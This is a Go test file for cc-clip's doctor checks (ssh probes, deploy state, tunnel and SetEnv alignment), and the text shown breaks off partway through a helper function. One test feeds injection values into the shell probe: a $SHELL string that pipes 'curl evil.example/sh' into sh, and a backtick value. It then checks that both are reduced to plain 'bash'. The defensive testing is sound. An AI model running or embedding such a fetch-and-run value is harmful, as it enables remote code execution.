package doctor

import (
	"bytes"
	"errors"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"testing"

	"github.com/shunmei/cc-clip/internal/exitcode"
	"github.com/shunmei/cc-clip/internal/peer"
	"github.com/shunmei/cc-clip/internal/shim"
	"github.com/shunmei/cc-clip/internal/tunnel"
)

// TestBuildInteractiveShellProbeOnlyEmitsLiteralShellNames pins the
// security contract for the $SHELL-driven probe: regardless of what the
// remote $SHELL returns, the produced script must contain only one of
// the three literal shell names ("bash", "zsh", "fish") at the start of
// the command — never the raw shellPath. A future refactor that
// interpolates shellPath would let a crafted remote $SHELL value (e.g.
// `/bin/bash -c pwned` or a path with shell metacharacters) reach ssh
// verbatim, which is the exact injection vector the literal-allowlist
// design exists to prevent.
func TestBuildInteractiveShellProbeOnlyEmitsLiteralShellNames(t *testing.T) {
	cases := []struct {
		name      string
		shellPath string
		wantHead  string // expected script prefix
	}{
		{name: "empty falls back to bash", shellPath: "", wantHead: "bash -ic"},
		{name: "ksh falls back to bash", shellPath: "/bin/ksh", wantHead: "bash -ic"},
		{name: "zsh literal substring matches", shellPath: "/usr/bin/zsh", wantHead: "zsh -ic"},
		{name: "fish literal substring matches", shellPath: "/opt/homebrew/bin/fish", wantHead: "fish -i -c"},
		{name: "command-injection attempt is sanitized to bash",
			shellPath: "/bin/bash -c 'curl evil.example/sh|sh'",
			// "/bin/bash" matches no zsh/fish substring → falls back to "bash"
			// and the suspicious -c never reaches argv because we ignore shellPath
			// from this point on.
			wantHead: "bash -ic"},
		{name: "command-injection via backtick stays sanitized",
			shellPath: "`pwned`",
			wantHead:  "bash -ic"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := buildInteractiveShellProbe(tc.shellPath, "cc-clip")
			if !strings.HasPrefix(got, tc.wantHead) {
				t.Fatalf("script %q does not start with %q", got, tc.wantHead)
			}
			// Defense in depth: regardless of the input, the raw shellPath
			// must not appear anywhere in the produced script (it would
			// only be there if a future refactor interpolated it).
			if tc.shellPath != "" && strings.Contains(got, tc.shellPath) {
				// Allow the substring overlap that comes from the shell-
				// name match (e.g. "zsh" appearing in "/usr/bin/zsh"). The
				// real risk is the *full path* leaking through, so check
				// that.
				if strings.Contains(got, "/") && strings.Contains(got, tc.shellPath) {
					t.Fatalf("raw shellPath %q leaked into script: %q", tc.shellPath, got)
				}
			}
		})
	}
}

func TestRemotePathExprExpandsLegacyHome(t *testing.T) {
	got := remotePathExpr("~/.cache/cc-clip")
	if got != `"$HOME/.cache/cc-clip"` {
		t.Fatalf("unexpected home-expanded path: %q", got)
	}
}

func TestRemotePathExprQuotesAbsolutePaths(t *testing.T) {
	got := remotePathExpr("/tmp/cc clip/peer-a")
	if got != `'/tmp/cc clip/peer-a'` {
		t.Fatalf("unexpected quoted path: %q", got)
	}
}

func TestCheckDeployStateResultMissing(t *testing.T) {
	got := checkDeployStateResult(nil, nil)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected missing deploy state failure, got %#v", got)
	}
}

// TestReadDeployStateRemoteCommandSurfacesReadErrors pins the shape of the
// remote command. The previous form
//
//	cat ~/.cache/cc-clip/deploy.json 2>/dev/null || echo '__NOTFOUND__'
//
// swallowed permission / quota / corruption errors as `__NOTFOUND__`, so
// doctor reported a broken host as "deploy state not tracked" and steered
// the operator toward `cc-clip connect --force`. The current form uses
// `test -e` to distinguish missing vs unreadable, then runs `cat` WITHOUT
// stderr redirection so read failures propagate as non-zero ssh exit.
// A regression that re-added `2>/dev/null` to the cat invocation would
// silently restore the masking bug; this test catches it.
func TestReadDeployStateRemoteCommandSurfacesReadErrors(t *testing.T) {
	cmd := readDeployStateRemoteCommand
	if !strings.Contains(cmd, "[ ! -e ~/.cache/cc-clip/deploy.json ]") {
		t.Fatalf("expected explicit existence check, got %q", cmd)
	}
	if strings.Contains(cmd, "2>/dev/null") {
		t.Fatalf("cat must not suppress stderr (would mask permission/IO errors), got %q", cmd)
	}
	if !strings.Contains(cmd, "__NOTFOUND__") {
		t.Fatalf("expected __NOTFOUND__ sentinel for the missing case, got %q", cmd)
	}
}

func TestCheckDeployStateResultValid(t *testing.T) {
	got := checkDeployStateResult(&shim.DeployState{
		BinaryHash: "sha256:test",
		Notify:     &shim.NotifyDeployState{Enabled: false},
	}, nil)
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("expected valid deploy state success, got %#v", got)
	}
}

func TestRemoteNonceResultSkipsDisabledNotifications(t *testing.T) {
	got := remoteNonceResult(&shim.DeployState{
		Notify: &shim.NotifyDeployState{Enabled: false},
	}, false)
	if !got.OK || got.Message != "notifications disabled by deploy config" {
		t.Fatalf("expected disabled-notify success, got %#v", got)
	}
}

func TestPeerLookupCheckResultFallsBackForLegacyRemote(t *testing.T) {
	got := peerLookupCheckResult(nil, fmt.Errorf("unknown command: peer"))
	if !got.OK || got.Message != "peer registry not configured on remote; using legacy state path" {
		t.Fatalf("expected legacy fallback success, got %#v", got)
	}
}

// TestPeerLookupCheckResultDoesNotMisclassifyModernUsageError pins the fix
// for the over-broad `strings.Contains(msg, "usage: cc-clip")` matcher.
// A modern remote running `cc-clip peer show` with bad args prints
// `usage: cc-clip peer show ...` to stderr; the previous matcher treated
// that as "legacy remote" and reported OK=true, hiding real failures.
func TestPeerLookupCheckResultDoesNotMisclassifyModernUsageError(t *testing.T) {
	cases := []error{
		fmt.Errorf("usage: cc-clip peer show --peer-id <id>"),
		fmt.Errorf("ssh exited 2: usage: cc-clip peer show --peer-id <id>"),
		fmt.Errorf("usage: cc-clip connect <host> [--port PORT]"),
	}
	for _, err := range cases {
		got := peerLookupCheckResult(nil, err)
		if got.OK {
			t.Fatalf("expected modern usage error to surface as failure, got OK for %v: %#v", err, got)
		}
		if !strings.Contains(got.Message, "peer registry lookup failed") {
			t.Fatalf("expected lookup-failed message for %v, got %#v", err, got)
		}
	}
}

func TestPeerLookupCheckResultFailsWhenPeerMissing(t *testing.T) {
	got := peerLookupCheckResult(nil, fmt.Errorf("peer show failed: peer peer-a not found"))
	if got.OK || !strings.Contains(got.Message, "peer registry lookup failed") {
		t.Fatalf("expected missing peer failure, got %#v", got)
	}
}

func TestPeerLookupCheckResultReportsActivePeer(t *testing.T) {
	got := peerLookupCheckResult(&peer.Registration{Label: "macbook", ReservedPort: 18340}, nil)
	if !got.OK || got.Message != "macbook -> port 18340" {
		t.Fatalf("expected active peer result, got %#v", got)
	}
}

func TestCheckTunnelStateAlignmentUsesSavedStateWithoutPeerReservation(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(host string) ([]*tunnel.TunnelState, error) {
		if host != "myserver" {
			t.Fatalf("host = %q, want myserver", host)
		}
		return []*tunnel.TunnelState{{
			Config: tunnel.TunnelConfig{
				Host:       "myserver",
				LocalPort:  18339,
				RemotePort: 18340,
			},
		}}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", nil, 18339)
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("expected tunnel-state check success, got %#v", got)
	}
	if got[0].Message != "peer SSH forwarding not configured; using saved tunnel state (remote:18340 -> local:18339)" {
		t.Fatalf("unexpected tunnel-state message: %#v", got)
	}
	if state == nil || state.Config.RemotePort != 18340 {
		t.Fatalf("state = %#v, want remote port 18340", state)
	}
}

func TestCheckTunnelStateAlignmentReportsMatch(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(host string) ([]*tunnel.TunnelState, error) {
		if host != "myserver" {
			t.Fatalf("host = %q, want myserver", host)
		}
		return []*tunnel.TunnelState{{
			Config: tunnel.TunnelConfig{
				Host:       "myserver",
				LocalPort:  18339,
				RemotePort: 18340,
			},
		}}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 18339)
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("expected match success, got %#v", got)
	}
	if got[0].Message != "saved tunnel state matches remote register (remote:18340 -> local:18339)" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state == nil || state.Config.RemotePort != 18340 {
		t.Fatalf("state = %#v, want remote port 18340", state)
	}
}

func TestCheckTunnelStateAlignmentReportsMismatch(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return []*tunnel.TunnelState{{
			Config: tunnel.TunnelConfig{
				Host:       "myserver",
				LocalPort:  18339,
				RemotePort: 19001,
			},
		}}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 18339)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected mismatch failure, got %#v", got)
	}
	if got[0].Message != "saved tunnel state for myserver on local port 18339 uses remote port 19001, but remote register uses 18340; rerun 'cc-clip connect myserver' to resync" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil on mismatch (caller must not derive remote port from an unrelated saved tunnel)", state)
	}
}

func TestCheckTunnelStateAlignmentReportsMatchOnSecondState(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return []*tunnel.TunnelState{
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18339, RemotePort: 19001}},
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18444, RemotePort: 18340}},
		}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 0)
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("expected match success on second state, got %#v", got)
	}
	if got[0].Message != "saved tunnel state matches remote register (remote:18340 -> local:18444)" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state == nil || state.Config.LocalPort != 18444 {
		t.Fatalf("state = %#v, want local port 18444", state)
	}
}

func TestCheckTunnelStateAlignmentHonorsSelectedLocalPort(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return []*tunnel.TunnelState{
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18339, RemotePort: 19001}},
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18444, RemotePort: 18340}},
		}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 18339)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected selected-port mismatch failure, got %#v", got)
	}
	if got[0].Message != "saved tunnel state for myserver on local port 18339 uses remote port 19001, but remote register uses 18340; rerun 'cc-clip connect myserver' to resync" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil when only another daemon's saved state matches", state)
	}
}

func TestCheckTunnelStateAlignmentReportsMismatchAcrossMultipleStates(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return []*tunnel.TunnelState{
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18339, RemotePort: 19001}},
			{Config: tunnel.TunnelConfig{Host: "myserver", LocalPort: 18444, RemotePort: 19002}},
		}, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 0)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected mismatch failure across multiple states, got %#v", got)
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil on multi-state mismatch", state)
	}
}

func TestCheckTunnelStateAlignmentReportsMissingState(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return nil, nil
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 18339)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected missing-state failure, got %#v", got)
	}
	if got[0].Message != "no local tunnel state for myserver; run 'cc-clip connect myserver' to record it" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil", state)
	}
}

func TestCheckTunnelStateAlignmentSurfacesLoadError(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return nil, errors.New("disk read failed")
	}

	got, state := checkTunnelStateAlignment("myserver", &peer.Registration{Label: "macbook", ReservedPort: 18340}, 18339)
	if len(got) != 1 || got[0].OK {
		t.Fatalf("expected load-error failure, got %#v", got)
	}
	if got[0].Message != "cannot read local tunnel state: disk read failed" {
		t.Fatalf("unexpected message %#v", got[0])
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil on error", state)
	}
}

func TestCheckLegacyManagedBlockReturnsNilWhenConfigMissing(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return nil, fmt.Errorf("open: no such file or directory")
	}

	if got := checkLegacyManagedBlock("myserver"); got != nil {
		t.Fatalf("expected nil for missing ssh config, got %#v", got)
	}
}

// TestLegacyManagedBlockAdvisoryWrapper pins the trivial wrapper contract:
// "" on clean config, the CheckResult.Message otherwise. The exported
// helper is what `cc-clip uninstall` calls to surface the same advisory
// the doctor emits, so its empty-vs-non-empty behavior is the contract
// operators depend on to suppress a noisy "" note on clean laptops.
func TestLegacyManagedBlockAdvisoryWrapper(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })

	t.Run("clean_config_returns_empty", func(t *testing.T) {
		readLocalSSHConfig = func() ([]byte, error) {
			return []byte("Host myserver\n  HostName example.com\n"), nil
		}
		if got := LegacyManagedBlockAdvisory("myserver"); got != "" {
			t.Fatalf("clean config: got %q, want empty", got)
		}
	})

	t.Run("leftover_block_returns_message", func(t *testing.T) {
		readLocalSSHConfig = func() ([]byte, error) {
			return []byte(
				"Host myserver\n" +
					"# >>> cc-clip managed host: myserver >>>\n" +
					"  RemoteForward 19001 127.0.0.1:18339\n" +
					"# <<< cc-clip managed host: myserver <<<\n",
			), nil
		}
		got := LegacyManagedBlockAdvisory("myserver")
		if got == "" {
			t.Fatal("leftover block: expected non-empty advisory")
		}
		if !strings.Contains(got, "delete the block manually") {
			t.Fatalf("leftover block: message missing guidance, got %q", got)
		}
	})

	t.Run("missing_config_returns_empty", func(t *testing.T) {
		readLocalSSHConfig = func() ([]byte, error) {
			return nil, fmt.Errorf("open: no such file or directory")
		}
		if got := LegacyManagedBlockAdvisory("myserver"); got != "" {
			t.Fatalf("missing config: got %q, want empty", got)
		}
	})
}

func TestCheckLegacyManagedBlockReturnsNilForCleanConfig(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte("Host myserver\n  HostName example.com\n  User alice\n"), nil
	}

	if got := checkLegacyManagedBlock("myserver"); got != nil {
		t.Fatalf("expected nil for clean ssh config, got %#v", got)
	}
}

func TestCheckLegacyManagedBlockSurfacesLeftoverMarker(t *testing.T) {
	oldRead := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = oldRead })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver\n  HostName example.com\n" +
				"# >>> cc-clip managed host: myserver >>>\n" +
				"  RemoteForward 19001 127.0.0.1:18339\n" +
				"# <<< cc-clip managed host: myserver <<<\n",
		), nil
	}

	got := checkLegacyManagedBlock("myserver")
	if got == nil {
		t.Fatal("expected legacy block advisory, got nil")
	}
	// This is a passive advisory: OK=true. `cc-clip doctor --host` must not
	// exit 1 on a cosmetic leftover that does not actually break the
	// daemon-owned tunnel (any CI/script gating on doctor's exit code
	// would otherwise break for users with pre-daemon-tunnel ssh configs).
	if !got.OK {
		t.Fatalf("expected advisory to be a passing check (OK=true), got %#v", got)
	}
	if got.Name != "ssh-config-legacy" {
		t.Fatalf("name = %q, want ssh-config-legacy", got.Name)
	}
	if !strings.Contains(got.Message, "myserver") {
		t.Fatalf("expected host alias in message, got %q", got.Message)
	}
	if !strings.Contains(got.Message, "delete the block manually") {
		t.Fatalf("expected manual-delete guidance in message, got %q", got.Message)
	}
	if !strings.Contains(got.Message, "SetEnv marker block") {
		t.Fatalf("expected SetEnv wording in message, got %q", got.Message)
	}
}

// TestCheckLegacyManagedBlockHandlesOtherHostAliasGenerically pins the P3
// fix for host-specificity: a leftover block for host "foo" must still
// advise (so users notice) but the message should not imply the current
// --host is the owner of that block.
func TestCheckLegacyManagedBlockHandlesOtherHostAliasGenerically(t *testing.T) {
	oldRead := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = oldRead })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host foo\n" +
				"# >>> cc-clip managed host: foo >>>\n" +
				"  RemoteForward 19001 127.0.0.1:18339\n" +
				"# <<< cc-clip managed host: foo <<<\n",
		), nil
	}
	got := checkLegacyManagedBlock("bar")
	if got == nil {
		t.Fatal("expected advisory when a DIFFERENT host alias has a legacy block")
	}
	if !got.OK {
		t.Fatalf("expected passing check (OK=true), got %#v", got)
	}
	if strings.Contains(got.Message, "managed host: bar") {
		t.Fatalf("message should not claim --host=bar owns the block: %q", got.Message)
	}
	if !strings.Contains(got.Message, "different host alias") {
		t.Fatalf("expected 'different host alias' hint, got %q", got.Message)
	}
}

func TestCheckLegacyManagedBlockDoesNotPrefixMatchOtherAlias(t *testing.T) {
	oldRead := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = oldRead })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver-prod\n" +
				"# >>> cc-clip managed host: myserver-prod >>>\n" +
				"  RemoteForward 19001 127.0.0.1:18339\n" +
				"# <<< cc-clip managed host: myserver-prod <<<\n",
		), nil
	}
	got := checkLegacyManagedBlock("myserver")
	if got == nil {
		t.Fatal("expected advisory for legacy block on a different alias")
	}
	if strings.Contains(got.Message, "managed host: myserver …") {
		t.Fatalf("message should not prefix-match myserver-prod as myserver: %q", got.Message)
	}
	if !strings.Contains(got.Message, "different host alias") {
		t.Fatalf("expected generic wording for different alias, got %q", got.Message)
	}
}

// TestCheckSetEnvAlignmentMatches pins the happy path: SetEnv block in
// ~/.ssh/config carries the same port+state-dir as the remote peer
// registration — the check passes with OK=true.
func TestCheckSetEnvAlignmentMatches(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver\n  HostName srv\n" +
				"  # >>> cc-clip SetEnv (do not edit) >>>\n" +
				"  SetEnv CC_CLIP_PORT=18340 CC_CLIP_STATE_DIR=/home/shared/.cache/cc-clip/peers/peer-a\n" +
				"  # <<< cc-clip SetEnv (do not edit) <<<\n",
		), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		PeerID:       "peer-a",
		Label:        "imac",
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil {
		t.Fatal("expected non-nil CheckResult on SetEnv match")
	}
	if !got.OK {
		t.Fatalf("expected OK=true on SetEnv match, got %#v", got)
	}
	if got.Name != "ssh-config-setenv" {
		t.Fatalf("name = %q, want ssh-config-setenv", got.Name)
	}
}

// TestCheckSetEnvAlignmentFailsOnPortMismatch pins the common stale-config
// case: the user ran `cc-clip connect` that reserved a new remote port
// but the ~/.ssh/config block still carries the old port. Interactive
// `ssh <host>` would push the stale port to the remote shims and silently
// route images through the wrong (or dead) daemon.
func TestCheckSetEnvAlignmentFailsOnPortMismatch(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver\n  HostName srv\n" +
				"  # >>> cc-clip SetEnv (do not edit) >>>\n" +
				"  SetEnv CC_CLIP_PORT=19999 CC_CLIP_STATE_DIR=/home/shared/.cache/cc-clip/peers/peer-a\n" +
				"  # <<< cc-clip SetEnv (do not edit) <<<\n",
		), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		PeerID:       "peer-a",
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing check on port mismatch, got %#v", got)
	}
	if !strings.Contains(got.Message, "CC_CLIP_PORT=19999") || !strings.Contains(got.Message, "18340") {
		t.Fatalf("expected message to surface both stale and expected ports, got %q", got.Message)
	}
	if !strings.Contains(got.Message, "cc-clip connect myserver") {
		t.Fatalf("expected resync guidance, got %q", got.Message)
	}
}

// TestCheckSetEnvAlignmentFailsOnStateDirMismatch exercises the parallel
// case for CC_CLIP_STATE_DIR — a stale state dir silently steers the
// remote shim to the wrong per-peer token/nonce.
func TestCheckSetEnvAlignmentFailsOnStateDirMismatch(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver\n  HostName srv\n" +
				"  # >>> cc-clip SetEnv (do not edit) >>>\n" +
				"  SetEnv CC_CLIP_PORT=18340 CC_CLIP_STATE_DIR=/home/shared/.cache/cc-clip/peers/OLD\n" +
				"  # <<< cc-clip SetEnv (do not edit) <<<\n",
		), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing check on state dir mismatch, got %#v", got)
	}
	if !strings.Contains(got.Message, "CC_CLIP_STATE_DIR") {
		t.Fatalf("expected message to mention CC_CLIP_STATE_DIR, got %q", got.Message)
	}
}

// TestCheckSetEnvAlignmentSkipsWithoutPeer pins that the check is silent
// when there is no peer registration to compare against — otherwise
// every legacy/pre-peer-registry install would surface a spurious warning.
func TestCheckSetEnvAlignmentSkipsWithoutPeer(t *testing.T) {
	if got := checkSetEnvAlignment("myserver", nil, nil, nil); got != nil {
		t.Fatalf("expected nil without peer, got %#v", got)
	}
	if got := checkSetEnvAlignment("myserver", &peer.Registration{}, nil, nil); got != nil {
		t.Fatalf("expected nil with empty peer, got %#v", got)
	}
}

// TestCheckSetEnvAlignmentFailsWhenManagedBlockMissing pins the P2-3
// severity-symmetry fix: a peer registration exists on the remote but
// the matching SetEnv block is missing from ~/.ssh/config, so the next
// interactive `ssh <host>` session will not push CC_CLIP_PORT and the
// remote shims mis-route. That is equivalently broken to a stale port
// (TestCheckSetEnvAlignmentFailsOnPortMismatch below), so the doctor
// surfaces OK=false in both cases and includes the exact manual line
// operators can paste while resyncing.
func TestCheckSetEnvAlignmentFailsWhenManagedBlockMissing(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte("Host myserver\n  HostName srv\n"), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing result when no managed block present, got %#v", got)
	}
	if !strings.Contains(got.Message, "exact manual line: SetEnv CC_CLIP_PORT=18340 CC_CLIP_STATE_DIR=/home/shared/.cache/cc-clip/peers/peer-a") {
		t.Fatalf("expected exact manual SetEnv line, got %q", got.Message)
	}
	if !strings.Contains(got.Message, "cc-clip connect myserver") {
		t.Fatalf("expected resync guidance, got %q", got.Message)
	}
}

func TestCheckSetEnvAlignmentFailsWhenManagedBlockMissingForLegacyPeer(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte("Host myserver\n  HostName srv\n"), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		ReservedPort: 18340,
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing result when no managed block present for legacy peer, got %#v", got)
	}
	if !strings.Contains(got.Message, "exact manual line: SetEnv CC_CLIP_PORT=18340") {
		t.Fatalf("expected exact manual SetEnv line, got %q", got.Message)
	}
}

func TestCheckSetEnvAlignmentReportsUnsupportedWildcardLayout(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte("Host *.example.com\n  HostName srv\n"), nil
	}

	got := checkSetEnvAlignment("srv.example.com", &peer.Registration{
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing result for wildcard-only layout, got %#v", got)
	}
	if !strings.Contains(got.Message, "wildcard/negation patterns") {
		t.Fatalf("expected unsupported-layout explanation, got %q", got.Message)
	}
	if strings.Contains(got.Message, "rerun 'cc-clip connect") {
		t.Fatalf("unexpected impossible remediation in message: %q", got.Message)
	}
}

func TestCheckSetEnvAlignmentFailsOnCorruptedManagedBlock(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return []byte(
			"Host myserver\n  HostName srv\n" +
				"  # >>> cc-clip SetEnv (do not edit) >>>\n" +
				"  # SetEnv line deleted by hand\n" +
				"  # <<< cc-clip SetEnv (do not edit) <<<\n",
		), nil
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		ReservedPort: 18340,
		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
	}, nil, nil)
	if got == nil || got.OK {
		t.Fatalf("expected failing result on corrupted managed block, got %#v", got)
	}
	if !strings.Contains(got.Message, "contains no SetEnv directive") {
		t.Fatalf("expected corrupted-block parse error, got %q", got.Message)
	}
}

// TestClassifyDoctorPeerNotFoundRequiresExitCodeAndSentinel pins the
// classifier contract using the SAME exec path production uses
// (runRemoteSSHCommand → cmd.Run() with cmd.Stderr = &buf). The earlier
// helper used cmd.CombinedOutput(), which happens to populate
// *exec.ExitError.Stderr automatically — masking the P1-A production bug
// where exitErr.Stderr was always nil. The helper below mirrors the
// production capture so these tests exercise the real code path.
func TestClassifyDoctorPeerNotFoundRequiresExitCodeAndSentinel(t *testing.T) {
	t.Run("matching_exit_code_and_sentinel", func(t *testing.T) {
		err, stdout, stderr := helperExitError(t, exitcode.PeerNotFound, exitcode.PeerNotFoundSentinel)
		if !classifyDoctorPeerNotFound(err, stdout, stderr) {
			t.Fatalf("expected sentinel + exit code %d to classify as peer-not-found", exitcode.PeerNotFound)
		}
	})

	t.Run("sentinel_without_matching_exit_code", func(t *testing.T) {
		err, stdout, stderr := helperExitError(t, exitcode.UsageError, exitcode.PeerNotFoundSentinel)
		if classifyDoctorPeerNotFound(err, stdout, stderr) {
			t.Fatal("classification should reject sentinel when exit code is not PeerNotFound")
		}
	})

	t.Run("matching_exit_code_without_sentinel", func(t *testing.T) {
		err, stdout, stderr := helperExitError(t, exitcode.PeerNotFound, "some other error")
		if classifyDoctorPeerNotFound(err, stdout, stderr) {
			t.Fatal("classification should reject exit code without sentinel")
		}
	})
}

// TestClassifyDoctorPeerNotFoundReadsSentinelFromProductionStderrPath is
// the P1-A regression test. It runs a subprocess via the SAME pattern
// runRemoteSSHCommand uses (cmd.Run with explicit cmd.Stderr sink so
// *exec.ExitError.Stderr stays nil) and asserts the classifier still
// recognises the sentinel. Before the fix, exitErr.Stderr was the only
// place the classifier looked — it would return false for this input
// and uninstall would treat a broken remote session as a clean success.
func TestClassifyDoctorPeerNotFoundReadsSentinelFromProductionStderrPath(t *testing.T) {
	err, stdout, stderr := helperExitError(t, exitcode.PeerNotFound, exitcode.PeerNotFoundSentinel)
	// Paranoid re-assertion of the production invariant: when an explicit
	// cmd.Stderr sink is used, *exec.ExitError.Stderr is NOT populated.
	// This is what makes the separate stderr argument load-bearing.
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) && exitErr.Stderr != nil {
		t.Fatalf("test scaffolding bug: exitErr.Stderr populated (%q); would mask the P1-A regression", exitErr.Stderr)
	}
	if !classifyDoctorPeerNotFound(err, stdout, stderr) {
		t.Fatalf("classifier missed sentinel that reached stderr via the production exec path; stderr=%q", stderr)
	}
}

// helperExitError spawns a short-lived subprocess that emits `stderrBody`
// on stderr, nothing on stdout, and exits with `code`. The capture mirrors
// runRemoteSSHCommand (cmd.Run + explicit cmd.Stderr sink), so the tests
// exercise exactly the exec shape that production uses. Do NOT switch to
// cmd.CombinedOutput/cmd.Output here without also reverting the P1-A fix
// — those variants populate *exec.ExitError.Stderr automatically and
// would hide a regression in the classifier's explicit-stderr argument.
func helperExitError(t *testing.T, code int, stderrBody string) (error, string, string) {
	t.Helper()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "echo "+stderrBody+" 1>&2 && exit "+fmt.Sprint(code))
	} else {
